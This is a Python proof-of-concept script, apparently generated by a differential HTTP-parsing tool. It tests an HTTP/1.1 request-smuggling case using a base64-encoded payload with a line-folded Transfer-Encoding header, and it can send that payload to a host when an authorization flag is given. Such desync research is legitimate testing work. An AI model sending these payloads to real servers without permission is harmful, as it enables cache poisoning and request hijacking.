#!/usr/bin/env python3
"""请求走私（HTTP/1.1 消息边界分歧）

由 CED 自动生成 —— 用例 58eb1c9e，场景 desync，领域 http1-framing。
零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。

    python poc_58eb1c9e.py                      # 离线：算清量化指标（默认，不联网）
    python poc_58eb1c9e.py --send HOST:PORT --i-am-authorized
                                            # 真的把最小复现样本发出去（仅限已授权目标）

合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。
"""
from __future__ import annotations

import argparse
import base64
import socket
import sys
from pathlib import Path


def _find_root() -> Path:
    """往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。"""
    here = Path(__file__).resolve()
    for parent in here.parents:
        if (parent / "ced" / "__init__.py").is_file():
            return parent
    return here.parent


ROOT = _find_root()
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from ced.impls import reference
from ced.orchestrate.chain import chain_evidence

CASE_ID = '58eb1c9e'
FRONT = 'ref-cl-first'
BACK = 'ref-loose-headers'
PAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpUcmFuc2Zlci1FbmNvZGluZzogY2h1bmsNCiBlZA0KDQo1DQpoZWxsbw0KMA0KDQo=')
EXPECT = (0, 0, 0)


def measure():
    """按两侧的策略算出量化指标。算不出来返回 None。"""
    try:
        front_policy = reference.policy_of(FRONT)
        back_policy = reference.policy_of(BACK)
    except KeyError:
        return None
    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)
    return ev.forwarded, ev.back_consumed, ev.smuggled_len


def main() -> int:
    ap = argparse.ArgumentParser(description="CED 生成的复现脚本")
    ap.add_argument("--send", metavar="HOST:PORT",
                    help="把最小复现样本真的发到这个地址（前置入口）")
    ap.add_argument("--i-am-authorized", action="store_true",
                    help="确认对 --send 的目标已获授权；缺此项则拒绝发送")
    args = ap.parse_args()

    print(f"用例        {CASE_ID}")
    print(f"链路        {FRONT} → {BACK}")
    print(f"样本长度    {len(PAYLOAD)} 字节")

    got = measure()
    ok = got is not None
    if got is None:
        print("量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现")
    else:
        forwarded, consumed, smuggled = got
        print(f"前置转发    {forwarded} 字节")
        print(f"后端消费    {consumed} 字节")
        print(f"被夹带      {smuggled} 字节")
        if EXPECT[0] is not None:
            ok = got == tuple(EXPECT)
            print(f"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）")

    if args.send:
        if not args.i_am_authorized:
            print("拒绝发送：--send 需要同时给出 --i-am-authorized"
                  "（只对自有或已授权目标使用）。")
            return 2
        host, _, port = args.send.rpartition(":")
        with socket.create_connection((host or "127.0.0.1", int(port)), timeout=10) as sock:
            sock.sendall(PAYLOAD)
            sock.shutdown(socket.SHUT_WR)
            response = b""
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response += chunk
        print(f"已发送      {args.send}，收到 {len(response)} 字节响应")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
